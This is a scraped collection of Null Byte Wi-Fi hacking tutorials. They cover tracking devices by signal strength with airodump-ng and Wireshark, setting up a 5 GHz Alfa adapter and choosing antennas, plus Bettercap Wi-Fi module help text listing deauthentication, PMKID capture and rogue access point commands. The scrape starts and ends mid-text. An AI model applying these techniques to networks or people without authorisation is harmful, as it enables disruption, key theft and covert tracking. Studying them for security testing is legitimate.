4A:F3:2A:2A:4E:E6  -68    0 - 1      0        2\nPress Control-C to stop the capture when you've found what you're looking for. Now, we need to determine the channel the network we want to track is on. Here, we've got several networks available, and we're going to follow the one with the SSID of \"ATTMfRfcmS.\"\nIf you want to get a rough idea of where the network has been seen before, you can type the BSSID into Wigle.net and look for any previous observations. Here, we can see that our target was observed twice.\nThe most important part of the information we get from running airodump-ng is the channel number that our target is transmitting on. Now that we know that it's broadcasting on channel 1, we'll restart our airodump-ng command to only scan on that channel.\nStep 3: Listen on the Channel & Start Wireshark\nIn our terminal window, we'll start airodump-ng again, but this time, we'll include the -c flag followed by the channel that our target is on. For channel 1, it should look like the following.\n~# airodump-ng wlan1mon -c 1\nIt's vital because Wireshark can't control the wireless card by itself, so we need to run airodump-ng to keep it on the correct channel and avoid losing packets while scanning on the wrong channel.\nAs airodump-ng runs on channel 1, it's time to start Wireshark. After Wireshark opens, select the \"wlan1mon\" card you have in monitor mode as your capture source, then click the blue shark fin icon on the top left to begin capturing packets on channel 1.\nYou should now see lots of packets being intercepted by Wireshark! Our next task is to identify a packet from our target and use it to create a display filter.\nStep 4: Identify & Filter the Target\nNow that we've got some packets to search through, we can quickly look for beacon frames that contain the name of the network we're looking for. After clicking on the beacon frame, click on the arrow next to \"IEEE 802.11\" and look for the \"Transmitter address\" or \"Source address\" field. That's what we'll use to build our capture filter to show only the device we're hunting for.\nRight-click on the \"Transmitter address\" to show a list of options, select \"Apply as filter,\" and then \"Selected\" to create a display filter that only shows packets transmitted from this device's BSSID. It should show all Wi-Fi transmissions from our network of interest and nothing from unrelated networks.\nYou should notice a new filter in the filter bar that looks like \"wlan.ta ==\" and the BSSID of the target Wi-Fi device. The capture filter simply says, \"show only packets with a transmitter address that matches this one.\"\nThe result is that we've isolated one Wi-Fi device, first by finding the channel it's on, and then by creating a filter to only show transmissions from the device we want to track. Now that we've isolated the signal we're following, it's time to start visualizing signal strength.\n* Don't Miss: Control Anything with a Wi-Fi Relay Switch Using aRest\nStep 5: Graph the Filtered Signal Strength\nTo start graphing signal strength, copy the display filter created, click on \"Statistics,\" then \"I/O Graph\" to launch Wireshark's graphing window. Click the plus (+) icon to create a new graph, and uncheck any other graphs that may be enabled.\nName your graph something you'll remember, and then, paste your display filter into the Display Filter field. Next, paste wlan_radio.signal_dbm into the Y Field box, and select \"AVG(Y Field)\" as the Y Axis. Finally, set the Style to \"Line,\" then the SMA Period to \"10 Interval SMA.\"\nOnce you've finished, your settings should look like below, and your signal strength graph should begin.\nThat graph is showing us the average signal strength of packets from our targeted device over time. Without moving the directional antenna of your adapter, let this average out for a minute to get a baseline reading. The signal may seem to vary wildly at first because Wireshark is graphing a small change in signal, but the graph will make more sense as we sweep around the room and encounter stronger and weaker signals that will stretch out the averages of the graph.\nStep 6: Sweep the Area for Signal Spikes\nNow, it's time for the moment of truth. Slowly rotate your directional antenna 360 degrees, watching for spikes in signal strength that reveal the direction from which the transmissions are coming from.\nIn our graph below, I slowly rotated a panel antenna from one side to the other and saw a huge spike when the antenna was pointed directly at the signal source.\nAfter sweeping back and forth a few times, you should be able to identify a spike in the signal. Walk towards the direction of the peak, and repeat a sweep for the signal to narrow down the location of any transmitting Wi-Fi device systematically.\nTracking Down Wi-Fi Devices Is Easy with the Right Gear\nWhenever a Wi-Fi network appears where it shouldn't or a device starts connecting to your Wi-Fi without permission, Wireshark and a network adapter can tell you where the signal is coming from. This valuable skill makes it easy to determine where a rogue AP might be hidden or who might be joining a network without permission. If you suspect your neighbor's been connecting to your Wi-Fi network and you haven't been able to prove it, this technique could provide you with all the evidence you need.\nI hope you've enjoyed this guide to tracking down Wi-Fi devices with Wireshark! If you have any questions about our tutorial on tracking devices via signal strength, leave a comment below, and feel free to reach me on Twitter @KodyKinzie.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image and screenshots by Kody/Null Byte",
        "category": "Wifi Hacking"
    },
    {
        "title": "Hack 5 GHz Wi-Fi Networks with an Alfa Wi-Fi Adapter",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-5-ghz-wi-fi-networks-with-alfa-wi-fi-adapter-0203515/",
        "content": "* WonderHowTo\nWi-Fi networks come in two flavors: the more common 2.4 GHz used by most routers and IoT devices, and the 5 GHz one offered as an alternative by newer routers. While it can be frustrating to attack a device that moves out of reach to a 5 GHz Wi-Fi network, we can use an Alfa dual-band adapter to hack Wi-Fi devices on either type of network.\nWi-Fi is a radio standard that has been around since 1997, and the number of devices using it has made its part of the spectrum quite crowded. To relieve that stress, 5 GHz was introduced to offer fast Wi-Fi connections over similar distances as a comparable 2.4 GHz network. For hackers going after Wi-Fi devices, a router that provides both 2.4 and 5 GHz networks can be a real problem, as attacks requiring sending de-authentication frames can simply cause the target device to move out of reach to the 5 GHz network.\n* Don't Miss: Research a Person or Organization Using the Operative Framework\n2.4 GHz vs 5 GHz Wi-Fi\nIn the United States, 2.4 GHz Wi-Fi can operate on any channel between one and eleven. While it may seem like a lot of room, the truth is that all but three of these channels overlap with each other, causing issues with interference and slow speeds when too many devices are on the same channel. The reason it happens is that each channel is really just the center frequency of a 22 MHz wide channel. That means only channels one, six, and eleven are far enough apart not to overlap.\nImage via Wikimedia Commons\nAs you can see in the picture above, devices on channels one and two would interfere with each other and share a lot of space on the radio spectrum. That makes it challenging to pack too many devices on to the same network, primarily because most IoT Wi-Fi devices operate on 2.4 GHz only.\nThe 5 GHz offering gives faster speeds, more channels, and more room for devices to transmit than 2.4 GHz, but it suffers from some limitations in range. Over shorter distances, the broader channels of 5 GHz can allow for faster data transfers, but not all devices support the frequency. Modern routers will typically offer both types to provide the most spectrum for congested Wi-Fi networks, and modern smartphones and laptops will likely support 5 GHz networks. That makes it equally likely that a device belonging to a target might be connected to the 5 GHz or 2.4 GHz networks, making it critical to be able to interact with both.\n* Don't Miss: Track Wi-Fi Devices & Connect to Them Using Probequest\nHacking 5 GHz Wi-Fi\nTo get started hacking 5 GHz networks, we'll need a network adapter with the proper chipset. The Alfa Wireless AWUS036ACS is a dual-band network adapter that offers both 2.4 and 5 GHz reception in a single feed line, and it can be combined with a long-range directional antenna like the Simple Wi-Fi 2.4/5 GHz Yagi antenna. While the AWUS036ACS driver is not plug-and-play with Kali Linux, it's simple to install on both Kali and Ubuntu systems.\nA close-up of the Alfa AWUS036ACS. Image by Kody/Null Byte\nOnce we have the drivers installed, hackers will find that many standard Wi-Fi hacking tools work perfectly well against 5 GHz targets. Kismet, Wireshark, the Aircrack suite, and Wifite2 are all updated to take advantage of the ability to target 5 GHz networks. That means hackers who can't access 5 GHz channels are missing out on half of the fun, which may become an issue with devices that can transition between both types of networks.\nThe Alfa AWUS036ACS wired up and ready. Image by Kody/Null Byte\nWhat You'll Need\nTo get started with hacking 5 GHz networks, you'll need a wireless network adapter that supports 5 GHz and preferably 2.4 GHz. The Alfa AWUS036ACS 802.11ac AC600 Wi-Fi Wireless Network Adapter does a great job.\nIf you want to extend your range, you can also look into a long-range directional antenna like the Simple Wi-Fi dual-band antenna, which can pick up both 2.4 and 5 GHz from over a mile away.\nImage by Kody/Null Byte\nStep 1: Install Drivers on Kali\nThanks to popular demand, Kali Linux has included the RealTek drivers needed to control many 5 GHz adapters. The installation process on Kali is by far the most simple, but it's critical to update and upgrade your system before doing so. Keep in mind that on a slow connection, it can take quite some time.\n~$ apt update && apt upgrade\n~$ apt dist-upgrade\nOnce your system is entirely up to date, you can install the drivers you need on Kali with the following command.\n~$ apt install realtek-rtl88xxau-dkms\nThat should install the driver, and you can try plugging in the network adapter after a reboot to see if the LED on it flashes immediately. Next, we'll test out the functionality of the adapter.\nStep 2: Set Monitor Mode in Kali Linux\nIf you can see the adapter when running ifconfig or ip a after installing the driver, we can move on to trying to put it into monitor mode to verify it works. First, we'll need to bring the interface down to put it into monitor mode. Make sure to replace wlan0 with the name of your wireless card.\n~$ sudo ip link set wlan0 down\nNext, we'll set monitor mode using iwconfig in the following command.\n~$ sudo iwconfig wlan0 mode monitor\nFinally, we'll bring the interface back up after it's been put in monitor mode.\n~$ sudo ip link set wlan0 up\nIf all of these steps worked smoothly, then your card should be in monitor mode, and you may be good to go. To try out working with 5 GHz channels, we can move on to the next step.\nStep 3: Test the Card on Kali\nTo test if we've got the card working on Kali, we'll try to set it to a 5 GHz channel. First, we can try to set the channel with the following command in a terminal window.\n~$ sudo iw wlan0 set channel 6 HT40-\nThat will attempt to set the channel to a 5 GHz frequency. In general, you can use this command to specify a channel in the 5 GHz range to listen in on. To set the channel to 149 with the channel width set to 80 MHz, we can modify the command to look like the example below.\n~$ sudo iw wlan0 set freq 5745 80 5775\nIf it isn't working, then you can move on to the manual installation, which also works on Ubuntu.\n* Don't Miss: Hunting Down & Cracking WEP Networks\nStep 4: Install Drivers on Ubuntu\nTo install the drivers directly, we'll be using the Aircrack-ng GitHub repo and DKMS. First, we'll need to install DKMS and download the GitHub repo with the command below.\n~$ sudo apt-get install dkms\n~$ git clone https://github.com/aircrack-ng/rtl8812au.git\nOnce it is installed, we can change directories into the repository by typing cd rtl8812au. Then, we just need to run a single command to install the driver from within the folder we downloaded.\n~$ sudo ./dkms-install.sh\nYou should see output like below if it's successful.\nAbout to run dkms install steps...\nCreating symlink /var/lib/dkms/rtl8812au/5.3.4/source ->\n/usr/src/rtl8812au-5.3.4\nDKMS: add completed.\nKernel preparation unnecessary for this kernel.  Skipping...\nBuilding module:\ncleaning build area...\n'make' -j2 KVER=4.15.0-55-generic KSRC=/lib/modules/4.15.0-55-generic/build..........................\nFinished running dkms install steps.\nFinally, let's run airodump-ng to test if the card can capture on a 5 GHz channel. The following command uses the --band option to set Airodump to scan through 5 GHz channels.\n~$ airodump-ng wlan1 --band a\nIf we've got the card up and running, we should start to see 5 GHz networks appear!\nCH 200 ][ Elapsed: 12 s ][ 2019-08-19 04:56\nBSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n00:69:54:32:12:99  -55        3        0    0   1  54e  WPA2 CCMP   PSK  MySpectrumWiFi69-2G\n88:24:62:94:10:2A  -74        1        0    0  -1  54e  WPA2 CCMP   PSK  MySpectrumWiFi96-5G\n5 GHz Networks Are in Easy Reach\nWhile network adapters like the Alfa Wireless AWUS036ACS may not be plug-and-play with Kali Linux, they are well supported and easy to get set up in only a few commands. Once you've got the drivers installed, you can easily use familiar tools like Wireshark to capture data on 5 GHz networks the same as 2.4 GHz networks. Thanks to these cheap and easy-to-set-up network adapters, a directional antenna can let a hacker manipulate 5 GHz networks from extreme distances on a budget.\n* Don't Miss: How to Pick an Antenna for Wi-Fi Hacking\nI hope you enjoyed this guide to getting started with hacking 5 GHz Wi-Fi networks! If you have any questions about this tutorial on setting up an Alfa Wireless AWUS036ACS, please ask below, and if you have a comment or idea for a future episode, feel free to reach me on Twitter @KodyKinzie.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo by Kody/Null Byte",
        "category": "Wifi Hacking"
    },
    {
        "title": "Pick an Antenna for Wi-Fi Hacking",
        "link": "https://null-byte.wonderhowto.com/how-to/pick-antenna-for-wi-fi-hacking-0202742/",
        "content": "* Buy on Amazon: SimpleWiFi G2424\nStep 1: Connect the Adapter & Enable Monitor Mode\nFirst, you'll need to connect your Kali-compatible Wi-Fi network adapter. Once it's plugged in, you can run ip a to find it. It should be named something like wlan1 if your internal card is wlan0.\n1:  lo: <LOOPBACK,UP,LOWER,UP> tu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\nlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\ninet 127.0.0.1/8 scope host lo\nvalid_lft forever preferred_lft forever\ninet6 ::1/128 scope host\nvalid_lft forever preferred_lft forever\n2:  eth0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000\nlink/ether ##:##:##:##:##:## brd ff:ff:ff:ff:ff:ff\n3:  wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000\nlink/ether ##:##:##:##:##:## brd ff:ff:ff:ff:ff:ff\ninet 192.168.0.24/24 brd 129.168.0.255 scope global dynamic noprefixroute wlan0\nvalid_lft 2335sec preferred_lft 2335sec\ninet6 ####:####:####:####:####:####:####:####/64 scope global dynamic noprefixroute\nvalid_lft 3599sec preferred_lft 3599sec\ninet6 ####::####:####:####:####/64 scope link noprefixroute\nvalid_lft forever preferred_lft forever\n6:  wlan1mon: <BROADCAST,ALLMULTI,PROMISC,NOTRAILERS,UP,LOWER_UP> mtu 1500 qdisc mq state UNKNOWN group default qlen 1000\nlink/ieee802.11/radiotap ##:##:##:##:##:## brd ff:ff:ff:ff:ff:ff\nNext, in a terminal window, run the following ifconfig command to bring the network adapter up and the airmon-ng command to put it into monitor mode. If your card is named something besides wlan1, make sure to change the name to match yours. Once your card is in monitor mode, you can run ifconfig to confirm the card is now named something like wlan1mon.\n~# ifconfig wlan1 up\n~# airmon-ng start wlan1\n~# ifconfiq\nNow that our card is in monitor mode, we'll be selecting a network to track as our reference point. We'll use the strength of this network's signal to test out our antennas and see what kind of signal strength each type of antenna gives us.\nFirst, let's pull up a list of Wi-Fi networks we can target. We can do this by running airodump-ng wlan1mon and watching the adapter scan through all the Wi-Fi channels. After the list has populated a bit, press Control-C to cancel the scan.\n* Don't Miss: Detect & Classify Wi-Fi Jamming Packets with the NodeMCU\n~# airodump-ng wlan1mon\nCH 11 ][ Elapsed: 0 s ][ 2020-04-30 04:36\nBSSID              PWR  Beacons    #Data,  #/s  CH  MB   ENC  CIPHER   AUTH ESSID\n##:##:##:##:##:##  -80        2        0     0  11  130  WPA2 CCMP     PSK  belkin.4d6\n##:##:##:##:##:##  -83        2        0     0  11  130  OPN                DAGOBAH SYSTEM-guest\n##:##:##:##:##:##  -81        2        0     0  11  130  WPA2 CCMP     PSK  DAGOBAH SYSTEM\n##:##:##:##:##:##  -65        2        0     0  11  130  WPA2 CCMP     PSK  Sky.NET\n##:##:##:##:##:##  -76        2        0     0   5  130  WPA2 CCMP     PSK  MySpectrumWiFi1b-2G\n##:##:##:##:##:##  -68        5        1     0  11  130  WPA2 CCMP     PSK  Carmen Merendez\n##:##:##:##:##:##  -82        3        0     0   1  130  WPA2 CCMP     PSK  MySpectrumWiFi58-2G\nBSSID              STATION             PWR Rate    Lost    Frames  Probe\n##:##:##:##:##:##   ##:##:##:##:##:##  -54  0 - 6      0        3\nNow, identify the channel that a network with a strong signal is on. We'll rerun the airodump-ng command with the added -c flag to scan only on the channel our target network is broadcasting. If we want to scan on channel 1, our command would look like below.\n~# airodump-ng wlan1mon -c 1\nCH  1 ][ Elapsed: 6 s ][ 2020-04-30 04:36\nBSSID              PWR  RXQ  Beacons    #Data,  #/s  CH  MB   ENC  CIPHER   AUTH ESSID\n##:##:##:##:##:##  -78   68       48        3     0   1  195  WPA2 CCMP     PSK  MySpectrumWiFi58-2G\n##:##:##:##:##:##  -82    0        6        3     0   1  195  WPA2 CCMP     PSK  TC8715D49\n##:##:##:##:##:##  -83    5        3        0     0   1   65  WPA2 CCMP     PSK  LG Aristo 6082\nBSSID              STATION             PWR Rate    Lost    Frames  Probe\nLeave this running in the terminal window. From here, we'll open Wireshark to begin graphing the data.\nStep 2: Open Wireshark & Select Target\nOnce Wireshark is open, select your network adapter as the source and click on the shark fin icon to start the capture. After the capture is started, you'll see a lot of packets from various networks in the area. Locate a broadcast packet from the network you want to track and click on it.\nUnder the IEEE 802.11 Beacon Frame information, look for the transmitter address and right-click on it. From the menu, click on \"Apply as Filter\" and then \"Selected\" to create a display filter for only transmissions from that Wi-Fi device.\nNow, you should only see packets from the device you're tracking, and you should have a display filter like the one below in the Wireshark filter bar.\nwlan.ta == 3a:53:9c:b4:39:ef\nThis is telling Wireshark to only display packets with a transmitter address matching that of the device you want to track. You can track any other device that is consistently broadcasting the same way, but you may have to target other data packets because smartphones don't give off beacon frames.\nStep 3: Monitor Signal Strength & Test Omnidirectional Antenna\nNow, plug in your omnidirectional antenna. After getting no signal at first, the signal jumps up when we screw on our omnidirectional antenna and stays there relatively no matter what angle the adapter is held.\nThis steady signal is good enough for reception and is resistant to change as I move the adapter around and through the room. The only position it doesn't like is its tip facing directly towards the Wi-Fi source.\nStep 4: Test the Directional Panel Antenna\nNext, screw in your directional panel antenna. After a signal drop from removing the omnidirectional antenna, we start to see a pattern take shape. The directional antenna can get a consistently higher signal strength when it is pointed directly at the source of the broadcasts but gets worse signal strength when pointed away.\nWe can use this directionality to achieve a higher signal strength when pointed at any fixed Wi-Fi target, but moving targets will cause a signal drop when they wander out of the main lobe of the panel.\nStep 5: Test the Parabolic Grid Antenna\nFinally, we attach the parabolic grid, and after a huge spike from unplugging the panel antenna, we start to get the highest signal strength we've been able to achieve so far. While sweeping the antenna back and forth, I can not only tell exactly where the source is, I can also get spikes of signal strength that greatly exceed anything I was able to get with the omnidirectional or panel antenna.\nIn the graph below, the omnidirectional and panel antenna are on the left of the signal spike in the middle, and the parabolic grid is on the right. Once we zeroed the parabolic dish in, we got a much stronger and more sensitive signal.\nTowards the end of the capture, I picked up the Wi-Fi device we were tracking in another room and observed a jump in signal strength from the dish, meaning it's possible to even detect when someone is moving a device physically with a highly directional antenna.\nDirectional Antennas Create Useful Radiation Patterns\nWhile directional network adapter can dramatically increase the signal of a network when aimed correctly, the advantage disappears or can shift as Wi-Fi signals bounce off walls and other obstacles. In an environment with many obstacles, you may find that the strongest signal a directional antenna can receive may be from an angle other than directly towards the source.\nIt's also worth noting that a larger omnidirectional antenna doesn't always mean a stronger signal. If a Wi-Fi source is closeby, a larger antenna can extend the strongest part of the radiation pattern beyond where the target is located.\nI hope you enjoyed this guide to using specialized antennas for Wi-Fi hacking! If you have any questions about this tutorial on using directional and omnidirectional antennas, leave a comment below, and feel free to reach me on Twitter @KodyKinzie.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo by Kody/Null Byte",
        "category": "Wifi Hacking"
    },
    {
        "title": "Hack Wi-Fi Networks with Bettercap",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-wi-fi-networks-with-bettercap-0194422/",
        "content": "You can follow our guide today with Kali Linux on your laptop, a Raspberry Pi running Kali Linux, or even Ubuntu with some additional installation. For best results, you should use Kali Linux, because Bettercap comes preinstalled.\nStep 1: Install Bettercap\nIf you have Kali Linux installed, you can find it in the \"Sniffing & Spoofing\" folder in the \"Applications\" menu or from a search.\nIf you don't have Bettercap, the documentation for the project is on the Bettercap website. If you're running Kali, you can run apt install bettercap to add it, as seen below. Then, you can locate the tool as seen above.\n~# apt install bettercap\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following package was automatically installed and is no longer required:\nUse 'apt autoremove' to remove it.\nThe following additional packages will be installed:\nbettercap-caplets\nSuggested packages:\nbettercap-ui\nThe following NEW packages will be installed:\nbettercap bettercap-caplets\n0 upgraded, 2 newly installed, 0 to remove and 1854 not upgraded.\nNeed to get 6,931 kB of archives.\nAfter this operation, 25.8 MB of additional disk space will be used.\nDo you want to continue? [Y/n] Y\nGet:1 http://archive.linux.duke.edu/kalilinux/kali kali-rolling/main amd64 bettercap amd64 2.26.1-0kali1 [6,821 kB]\nGet:2 http://archive.linux.duke.edu/kalilinux/kali kali-rolling/main amd64 bettercap-caplets all 0+git20191009-0kali1 [110 kB]\nFetched 6,931 kB in 3s (2,332 kB/s)\nSelecting previously unselected package bettercap.\n(Reading database ... 417705 files and directories currently installed.)\nPreparing to unpack .../bettercap_2.26.1-0kali1_amd64.deb ...\nUnpacking bettercap (2.26.1-0kali1) ...\nSelecting previously unselected package bettercap-caplets.\nPreparing to unpack .../bettercap-caplets_0+git20191009-0kali1_all.deb ...\nUnpacking bettercap-caplets (0+git20191009-0kali1) ...\nSetting up bettercap-caplets (0+git20191009-0kali1) ...\nSetting up bettercap (2.26.1-0kali1) ...\nbettercap.service is a disabled or a static unit, not starting it.\nIf you're not running Kali, you'll need to refer to Bettercap's more complicated setup. If you're on a Mac, you can do network recon, but the modules I'm writing about won't work. Still, you can check out other features by installing it with Homebrew, using the command brew install bettercap.\nStep 2: Launch Bettercap\nWhen ready, click on Bettercap's icon to launch it. You should see the following help menu in a terminal window, although the tool will not automatically start.\nUsage of bettercap:\n-autostart string\nComma separated list of modules to auto start. (default \"events.stream\")\n-caplet string\nRead commands from this file and execute them in the interactive session.\n-cpu-profile file\nWrite cpu profile file.\nPrint debug messages.\n-env-file string\nLoad environment variables from this file if found, set to empty to disable environment persistence.\n-eval string\nRun one or more commands separated by ; in the interactive session, used to set variables via command line.\n-gateway-override string\nUse the provided IP address instead of the default gateway. If not specified or invalid, the default gateway will be used.\n-iface string\nNetwork interface to bind to, if empty the default interface will be auto selected.\n-mem-profile file\nWrite memory profile to file.\nDisable output color effects.\n-no-history\nDisable interactive session history file.\nSuppress all logs which are not errors.\nPrint the version and exit.\nHere, we can see the arguments we can start Bettercap with. One of the most useful of these is -iface which allows us to define which interface to work with. If we have an external wireless network adapter, we'll need to define it with that.\nStep 3: Connect Your Network Adapter & Start\nNow, we'll need to put our card into monitor mode. If we're connected to a Wi-Fi network already, Bettercap will start sniffing that network instead, so monitor mode always comes first.\nLocate your card with ifconfig or ip a to find the name of your network adapter. It should be something like wlan0 for your internal adapter and wlan1 for your USB network adapter.\n~# ifconfig\neth0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500\nether 50:7b:9d:7a:c8:8a  txqueuelen 1000  (Ethernet)\nRX packets 0  bytes 0 (0.0 B)\nRX errors 0  dropped 0  overruns 0  frame 0\nTX packets 0  bytes 0 (0.0 B)\nTX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\ninet 127.0.0.1  netmask 255.0.0.0\ninet6 ::1  prefixlen 128  scopeid 0x10<host>\nloop  txqueuelen 1000  (Local Loopback)\nRX packets 38625  bytes 3052647 (2.9 MiB)\nRX errors 0  dropped 0  overruns 0  frame 0\nTX packets 38625  bytes 3052647 (2.9 MiB)\nTX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\nwlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\ninet 192.168.5.93  netmask 255.255.255.0  broadcast 192.168.5.255\ninet6  prefixlen 64  scopeid 0x20<link>\nether   txqueuelen 1000  (Ethernet)\nRX packets 451  bytes 119964 (117.1 KiB)\nRX errors 0  dropped 0  overruns 0  frame 0\nTX packets 364  bytes 115672 (112.9 KiB)\nTX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\nwlan1: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500\nether 18:d6:c7:0e:e7:a1  txqueuelen 1000  (Ethernet)\nRX packets 0  bytes 0 (0.0 B)\nRX errors 0  dropped 0  overruns 0  frame 0\nTX packets 0  bytes 0 (0.0 B)\nTX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\nTake the adapter that's monitor mode-compatible, and switch it to monitor mode by opening a terminal window and typing airmon-ng start wlan1, with wlan1 substituted with the name of your network adapter.\n* More Info: How to Put Your Wireless Card in Monitor Mode\n~# airmon-ng start wlan1\nFound 3 processes that could cause trouble.\nKill them using 'airmon-ng check kill' before putting\nthe card in monitor mode, they will interfere by changing channels\nand sometimes putting the interface back in managed mode\n559 NetworkManager\n621 wpa_supplicant\n14785 dhclient\nPHY Interface   Driver      Chipset\nphy0    wlan0       ath9k       Qualcomm Atheros QCA9565 / AR9565 Wireless Network Adapter (rev 01)\nphy3    wlan1       ath9k_htc   Atheros Communications, Inc. AR9271 802.11n\n(mac80211 monitor mode vif enabled for [phy3]wlan1 on [phy3]wlan1mon)\n(mac80211 station mode vif disabled for [phy3]wlan1)\nYou can then type ifconfig or ip a again to verify it started.\n~# ifconfig\neth0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500\nether 50:7b:9d:7a:c8:8a  txqueuelen 1000  (Ethernet)\nRX packets 0  bytes 0 (0.0 B)\nRX errors 0  dropped 0  overruns 0  frame 0\nTX packets 0  bytes 0 (0.0 B)\nTX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\ninet 127.0.0.1  netmask 255.0.0.0\ninet6 ::1  prefixlen 128  scopeid 0x10<host>\nloop  txqueuelen 1000  (Local Loopback)\nRX packets 38645  bytes 3053647 (2.9 MiB)\nRX errors 0  dropped 0  overruns 0  frame 0\nTX packets 38645  bytes 3053647 (2.9 MiB)\nTX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\nwlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\ninet 192.168.5.93  netmask 255.255.255.0  broadcast 192.168.5.255\ninet6  prefixlen 64  scopeid 0x20<link>\nether  txqueuelen 1000  (Ethernet)\nRX packets 490  bytes 126996 (124.0 KiB)\nRX errors 0  dropped 0  overruns 0  frame 0\nTX packets 386  bytes 126911 (123.9 KiB)\nTX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\nwlan1mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\nunspec 18-D6-C7-0E-E7-A1-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)\nRX packets 1202  bytes 363761 (355.2 KiB)\nRX errors 0  dropped 1176  overruns 0  frame 0\nTX packets 0  bytes 0 (0.0 B)\nTX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\nAfter making sure that your wireless card is in monitor mode, you can start Bettercap by typing sudo bettercap --iface wlan1mon in a new terminal window, substituting the \"wlan1\" portion with your card's name.\n~# sudo bettercap --iface wlan1mon\nbettercap v2.24.1 (built for linux amd64 with go1.12.7) [type 'help' for a list of commands]\nOnce Bettercap opens, type help to see a list of all the modules running and commands. In the modules, you can see that the Wi-Fi module is not started by default.\nwlan1  » help\nhelp MODULE : List available commands or show module specific help if no module name is provided.\nactive : Show information about active modules.\nquit : Close the session and exit.\nsleep SECONDS : Sleep for the given amount of seconds.\nget NAME : Get the value of variable NAME, use * alone for all, or NAME* as a wildcard.\nset NAME VALUE : Set the VALUE of variable NAME.\nread VARIABLE PROMPT : Show a PROMPT to ask the user for input that will be saved inside VARIABLE.\nclear : Clear the screen.\ninclude CAPLET : Load and run this caplet in the current session.\n! COMMAND : Execute a shell command and print its output.\nalias MAC NAME : Assign an alias to a given endpoint given its MAC address.\nany.proxy > not running\napi.rest > not running\narp.spoof > not running\nble.recon > not running\ncaplets > not running\ndhcp6.spoof > not running\ndns.spoof > not running\nevents.stream > running\ngps > not running\nhttp.proxy > not running\nhttp.server > not running\nhttps.proxy > not running\nhttps.server > not running\nmac.changer > not running\nmysql.server > not running\nnet.probe > not running\nnet.recon > running\nnet.sniff > not running\npacket.proxy > not running\nsyn.scan > not running\ntcp.proxy > not running\nticker > not running\nupdate > not running\nwifi > not running\nwol > not running\nStep 4: Scan for Nearby Networks\nTo get started, let's look at the commands we can issue under the Wi-Fi module. We can see this information by typing help wifi into Bettercap.\nwlan1  » help wifi\nwifi (running): A module to monitor and perform wireless attacks on 802.11.\nwifi.recon on : Start 802.11 wireless base stations discovery and channel hopping.\nwifi.recon off : Stop 802.11 wireless base stations discovery and channel hopping.\nwifi.clear : Clear all access points collected by the WiFi discovery module.\nwifi.recon MAC : Set 802.11 base station address to filter for.\nwifi.recon clear : Remove the 802.11 base station filter.\nwifi.deauth BSSID : Start a 802.11 deauth attack, if an access point BSSID is provided, every client will be deauthenticated, otherwise only the selected client. Use 'all', '*' or a broadcast BSSID (ff:ff:ff:ff:ff:ff) to iterate every access point with at least one client and start a deauth attack for each one.\nwifi.assoc BSSID : Send an association request to the selected BSSID in order to receive a RSN PMKID key. Use 'all', '*' or a broadcast BSSID (ff:ff:ff:ff:ff:ff) to iterate for every access point.\nwifi.ap : Inject fake management beacons in order to create a rogue access point.\nwifi.show.wps BSSID : Show WPS information about a given station (use 'all', '*' or a broadcast BSSID for all).\nwifi.show : Show current wireless stations list (default sorting by essid).\nwifi.recon.channel : WiFi channels (comma separated) or 'clear' for channel hopping.\nwifi.ap.bssid : BSSID of the fake access point. (default=<random mac>)\nwifi.ap.channel : Channel of the fake access point. (default=1)\nwifi.ap.encryption : If true, the fake access point will use WPA2, otherwise it'll result as an open AP. (default=true)\nwifi.ap.ssid : SSID of the fake access point. (default=FreeWiFi)\nwifi.assoc.open : Send association requests to open networks. (default=false)\nwifi.assoc.silent : If true, messages from wifi.assoc will be suppressed. (default=false)\nwifi.assoc.skip : Comma separated list of BSSID to skip while sending association requests. (default=)\nwifi.deauth.open : Send wifi deauth packets to open networks. (default=true)\nwifi.deauth.silent : If true, messages from wifi.deauth will be suppressed. (default=false)\nwifi.deauth.skip : Comma separated list of BSSID to skip while sending deauth packets. (default=)\nwifi.handshakes.file : File path of the pcap file to save handshakes to. (default=~/bettercap-wifi-handshakes.pcap)\nwifi.hop.period : If channel hopping is enabled (empty wifi.recon.channel), this is the time in milliseconds the algorithm will hop on every channel (it'll be doubled if both 2.4 and 5.0 bands are available). (default=250)\nwifi.region : Set the WiFi region to this value before activating the interface. (default=BO)\nwifi.rssi.min : Minimum WiFi signal strength in dBm. (default=-200)\nwifi.show.filter : Defines a regular expression filter for wifi.show (default=)\nwifi.show.limit : Defines limit for wifi.show (default=0)\nwifi.show.sort : Defines sorting field (rssi, bssid, essid, channel, encryption, clients, seen, sent, rcvd) and direction (asc or desc) for wifi.show 